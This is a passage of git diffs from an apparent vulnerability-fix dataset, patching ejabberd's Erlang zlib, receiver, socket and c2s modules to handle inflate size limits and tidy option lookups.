SizeLimit} = _ZlibSoc\n \t<<0, In\/binary>> ->\n \t    {ok, In};\n \t<<1, Error\/binary>> ->\n-\t    {error, binary_to_list(Error)}\n+\t    {error, erlang:binary_to_existing_atom(Error, latin1)}\n     end.\n \n send(#zlibsock{sockmod = SockMod, socket = Socket, zlibport = Port},\n@@ -153,7 +153,9 @@ send(#zlibsock{sockmod = SockMod, socket = Socket, zlibport = Port},\n \t<<0, Out\/binary>> ->\n \t    SockMod:send(Socket, Out);\n \t<<1, Error\/binary>> ->\n-\t    {error, binary_to_list(Error)}\n+        {error, erlang:binary_to_existing_atom(Error, latin1)};\n+    _ ->\n+        {error, deflate_error}\n     end.\n \n \ndiff --git a\/apps\/ejabberd\/src\/xml_stream.erl b\/apps\/ejabberd\/src\/xml_stream.erl\nindex 4ad78e8884..030ff262b5 100644\n--- a\/apps\/ejabberd\/src\/xml_stream.erl\n+++ b\/apps\/ejabberd\/src\/xml_stream.erl\n@@ -126,7 +126,7 @@ parse(#xml_stream_state{callback_pid = CallbackPid,\n     if\n \tNewSize > MaxSize ->\n \t    catch gen_fsm:send_event(CallbackPid,\n-\t\t\t\t     {xmlstreamerror, \"XML stanza is too big\"});\n+\t\t\t\t     {xmlstreamerror, <<\"XML stanza is too big\">>});\n \ttrue ->\n \t    ok\n     end,\ndiff --git a\/rel\/files\/ejabberd.cfg b\/rel\/files\/ejabberd.cfg\nindex 586779f0ea..e51360bce7 100644\n--- a\/rel\/files\/ejabberd.cfg\n+++ b\/rel\/files\/ejabberd.cfg\n@@ -167,6 +167,8 @@\n \t\t\t{max_stanza_size, 65536}\n \t\t       ]},\n \n+  {{secondary_c2s}}\n+\n   %%\n   %% To enable the old SSL connection method on port 5223:\n   %%\ndiff --git a\/rel\/reltool_vars\/node1_vars.config b\/rel\/reltool_vars\/node1_vars.config\nindex 13d062bfcf..6b4520f3ef 100644\n--- a\/rel\/reltool_vars\/node1_vars.config\n+++ b\/rel\/reltool_vars\/node1_vars.config\n@@ -13,6 +13,13 @@\n {s2s_default_policy, allow}.\n {node_name, \"ejabberd@localhost\"}.\n {ejabberd_c2s_port, 5222}.\n+{secondary_c2s,\n+    \"{ 5223, ejabberd_c2s, [\n+    {zlib, 4096},\n+    {access, c2s},\n+        {shaper, c2s_shaper},\n+        {max_stanza_size, 65536}\n+    ]},\"}.\n {ejabberd_s2s_in_port, 5269}.\n {mod_last, \"{mod_last, []},\"}.\n {mod_offline, \"{mod_offline, [{access_max_user_messages, max_user_offline_messages}]},\"}.\n\ndiff --git a\/apps\/ejabberd\/src\/ejabberd_c2s.erl b\/apps\/ejabberd\/src\/ejabberd_c2s.erl\nindex e596df07e7..cedce4c0c1 100644\n--- a\/apps\/ejabberd\/src\/ejabberd_c2s.erl\n+++ b\/apps\/ejabberd\/src\/ejabberd_c2s.erl\n@@ -161,8 +161,8 @@ get_presence(FsmRef) ->\n     ?GEN_FSM:sync_send_all_state_event(FsmRef, get_presence, 1000).\n \n get_aux_field(Key, #state{aux_fields = Opts}) ->\n-    case lists:keysearch(Key, 1, Opts) of\n-\t{value, {_, Val}} ->\n+    case lists:keyfind(Key, 1, Opts) of\n+\t{_, Val} ->\n \t    {ok, Val};\n \t_ ->\n \t    error\n@@ -208,21 +208,21 @@ stop(FsmRef) ->\n %%          {stop, StopReason}\n %%----------------------------------------------------------------------\n init([{SockMod, Socket}, Opts]) ->\n-    Access = case lists:keysearch(access, 1, Opts) of\n-\t\t {value, {_, A}} -> A;\n+    Access = case lists:keyfind(access, 1, Opts) of\n+\t\t {_, A} -> A;\n \t\t _ -> all\n \t     end,\n-    Shaper = case lists:keysearch(shaper, 1, Opts) of\n-\t\t {value, {_, S}} -> S;\n+    Shaper = case lists:keyfind(shaper, 1, Opts) of\n+\t\t {_, S} -> S;\n \t\t _ -> none\n \t     end,\n     XMLSocket =\n-\tcase lists:keysearch(xml_socket, 1, Opts) of\n-\t    {value, {_, XS}} -> XS;\n+\tcase lists:keyfind(xml_socket, 1, Opts) of\n+\t    {_, XS} -> XS;\n \t    _ -> false\n \tend,\n-    Zlib = case lists:keysearch(zlib, 1, Opts) of\n-               {value, {_, ZlibLimit}} -> {true, ZlibLimit};\n+    Zlib = case lists:keyfind(zlib, 1, Opts) of\n+               {_, ZlibLimit} -> {true, ZlibLimit};\n                _ -> {false, 0}\n            end,\n     StartTLS = lists:member(starttls, Opts),\n@@ -331,7 +331,7 @@ wait_for_stream({xmlstreamstart, _Name, Attrs}, StateData) ->\n \t\t    SockMod =\n \t\t\t (StateData#state.sockmod):get_sockmod(\n \t\t\t   StateData#state.socket),\n-            {Zlib, _} = StateData#state.zlib,\n+\t\t    {Zlib, _} = StateData#state.zlib,\n \t\t    CompressFeature =\n \t\t\tcase Zlib andalso\n \t\t\t      ((SockMod == gen_tcp) orelse\n@@ -472,8 +472,7 @@ wait_for_stream(closed, StateData) ->\n wait_for_auth({xmlstreamelement, El}, StateData) ->\n     case is_auth_packet(El) of\n \t{auth, _ID, get, {U, _, _, _}} ->\n-\t    XE = #xmlel{name = Name,\n-                        attrs = Attrs} = jlib:make_result_iq_reply(El),\n+\t    XE = jlib:make_result_iq_reply(El),\n \t    case U of\n \t\t<<>> ->\n \t\t    UCdata = [];\n@@ -2220,8 +2219,8 @@ check_from(El, FromJID) ->\n     end.\n \n fsm_limit_opts(Opts) ->\n-    case lists:keysearch(max_fsm_queue, 1, Opts) of\n-\t{value, {_, N}} when is_integer(N) ->\n+    case lists:keyfind(max_fsm_queue, 1, Opts) of\n+\t{_, N} when is_integer(N) ->\n \t    [{max_queue, N}];\n \t_ ->\n \t    case ejabberd_config:get_local_option(max_fsm_queue) of\ndiff --git a\/apps\/ejabberd\/src\/ejabberd_receiver.erl b\/apps\/ejabberd\/src\/ejabberd_receiver.erl\nindex 25c2b37cf5..6ee7c8ae39 100644\n--- a\/apps\/ejabberd\/src\/ejabberd_receiver.erl\n+++ b\/apps\/ejabberd\/src\/ejabberd_receiver.erl\n@@ -161,9 +161,9 @@ handle_call({compress, ZlibSocket}, _From,\n     case ejabberd_zlib:recv_data(ZlibSocket, \"\") of\n \t{ok, ZlibData} ->\n \t    {reply, ok, process_data(ZlibData, NewState), ?HIBERNATE_TIMEOUT};\n-    {error, inflate_size_exceeded} ->\n-        ?GEN_FSM:send_event(C2SPid, {xmlstreamerror, <<\"XML stanza is too big\">>}),\n-        {reply, ok, NewState, ?HIBERNATE_TIMEOUT};\n+\t{error, inflate_size_exceeded} ->\n+\t    ?GEN_FSM:send_event(C2SPid, {xmlstreamerror, <<\"XML stanza is too big\">>}),\n+\t    {reply, ok, NewState, ?HIBERNATE_TIMEOUT};\n \t{error, inflate_error} ->\n \t    {stop, normal, ok, NewState}\n     end;\n@@ -209,7 +209,7 @@ handle_cast(_Msg, State) ->\n %%--------------------------------------------------------------------\n handle_info({Tag, _TCPSocket, Data},\n \t    #state{socket = Socket,\n-           c2s_pid = C2SPid,\n+\t\t   c2s_pid = C2SPid,\n \t\t   sock_mod = SockMod} = State)\n   when (Tag == tcp) or (Tag == ssl) or (Tag == ejabberd_xml) ->\n     case SockMod of\n@@ -226,9 +226,9 @@ handle_info({Tag, _TCPSocket, Data},\n \t\t{ok, ZlibData} ->\n \t\t    {noreply, process_data(ZlibData, State),\n \t\t     ?HIBERNATE_TIMEOUT};\n-        {error, inflate_size_exceeded} ->\n-            ?GEN_FSM:send_event(C2SPid, {xmlstreamerror, <<\"XML stanza is too big\">>}),\n-            {noreply, State, ?HIBERNATE_TIMEOUT};\n+\t\t{error, inflate_size_exceeded} ->\n+\t\t    ?GEN_FSM:send_event(C2SPid, {xmlstreamerror, <<\"XML stanza is too big\">>}),\n+\t\t    {noreply, State, ?HIBERNATE_TIMEOUT};\n \t\t{error, inflate_error} ->\n \t\t    {stop, normal, State}\n \t    end;\ndiff --git a\/apps\/ejabberd\/src\/ejabberd_socket.erl b\/apps\/ejabberd\/src\/ejabberd_socket.erl\nindex 0f45038836..c824cc7334 100644\n--- a\/apps\/ejabberd\/src\/ejabberd_socket.erl\n+++ b\/apps\/ejabberd\/src\/ejabberd_socket.erl\n@@ -156,7 +156,7 @@ compress(SocketData, InflateSizeLimit, Data) ->\n     {ok, ZlibSocket} = ejabberd_zlib:enable_zlib(\n \t\t\t SocketData#socket_state.sockmod,\n \t\t\t SocketData#socket_state.socket,\n-             InflateSizeLimit),\n+\t\t\t InflateSizeLimit),\n     ejabberd_receiver:compress(SocketData#socket_state.receiver, ZlibSocket),\n     send(SocketData, Data),\n     SocketData#socket_state{socket = ZlibSocket, sockmod = ejabberd_zlib}.\ndiff --git a\/apps\/ejabberd\/src\/ejabberd_zlib.erl b\/apps\/ejabberd\/src\/ejabberd_zlib.erl\nindex c54518e493..356206df1a 100644\n--- a\/apps\/ejabberd\/src\/ejabberd_zlib.erl\n+++ b\/apps\/ejabberd\/src\/ejabberd_zlib.erl\n@@ -144,7 +144,7 @@ recv_data1(#zlibsock{zlibport = Port, inflate_size_limit = SizeLimit} = _ZlibSoc\n \t<<0, In\/binary>> ->\n \t    {ok, In};\n \t<<1, Error\/binary>> ->\n-\t    {error, erlang:binary_to_existing_atom(Error, latin1)}\n+\t    {error, erlang:binary_to_existing_atom(Error, utf8)}\n     end.\n \n send(#zlibsock{sockmod = SockMod, socket = Socket, zlibport = Port},\n@@ -153,9 +153,9 @@ send(#zlibsock{sockmod = SockMod, socket = Socket, zlibport = Port},\n \t<<0, Out\/binary>> ->\n \t    SockMod:send(Socket, Out);\n \t<<1, Error\/binary>> ->\n-        {error, erlang:binary_to_existing_atom(Error, latin1)};\n-    _ ->\n-        {error, deflate_error}\n+\t    {error, erlang:binary_to_existing_atom(Error, utf8)};\n+\t_ ->\n+\t    {error, deflate_error}\n     end.\n \n \n","owner":"NA","repo":"NA","source":"cve"}]